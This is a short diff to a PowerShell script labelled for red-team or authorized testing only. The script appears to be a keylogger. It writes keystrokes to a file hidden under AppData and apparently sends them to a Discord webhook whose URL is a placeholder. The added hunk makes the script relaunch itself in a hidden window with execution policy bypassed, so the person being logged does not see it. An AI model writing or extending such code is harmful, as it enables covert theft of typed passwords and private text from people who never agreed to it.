@@ -2,6 +2,15 @@
 # Educational / Red Team / Authorized Testing Only
 # DO NOT use on systems you do not own or have explicit permission to test
 
+# Hide the console window by relaunching the script with a hidden window style
+if (-not $env:RUNNING_HIDDEN) {
+    $env:RUNNING_HIDDEN = "1"
+    Start-Process powershell `
+        -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" `
+        -WindowStyle Hidden
+    exit
+}
+
 $webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE"
 
 $logPath = "$env:APPDATA\Microsoft\Windows\keylog.txt"
